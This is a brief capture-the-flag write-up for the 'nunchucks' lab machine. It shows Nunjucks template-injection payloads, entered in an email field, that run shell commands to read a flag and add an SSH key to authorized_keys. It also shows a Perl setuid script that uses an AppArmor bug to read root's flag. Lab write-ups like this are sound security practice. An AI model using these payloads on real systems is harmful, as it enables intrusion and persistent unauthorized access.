nunchucks
---

## Steps

1. wfuzz to find subdomain

We find the page `store.nunchucks.htb`

2. SSTI

When entering the email, its vulnerable to SSTI

http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine

Enter as email `{{range.constructor("return global.process.mainModule.require('child_process').execSync('cat /home/david/user.txt')")()}}@email.com`

2. SSH

Enter as email `{{range.constructor("return global.process.mainModule.require('child_process').execSync('mkdir /home/david/.ssh')")()}}@email.com`
Enter as email `{{range.constructor("return global.process.mainModule.require('child_process').execSync('touch /home/david/.ssh/authorized_keys')")()}}@email.com`
Enter as email `{{range.constructor("return global.process.mainModule.require('child_process').execSync('echo <ssh key> >> /home/david/.ssh/authorized_keys')")()}}@email.com`

## Root Flag

1. Trail and Error

Find `/opt/backup.pl`, and it runs `POSIX::setuid(0);`, which means that perl has `setuid` capabilities

https://gtfobins.github.io/gtfobins/perl/#capabilities

but this fails

2. AppArmor bug

https://bugs.launchpad.net/apparmor/+bug/1911431

```
#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);

exec "cat /root/root.txt"
```

```
$ ./a.pl
```
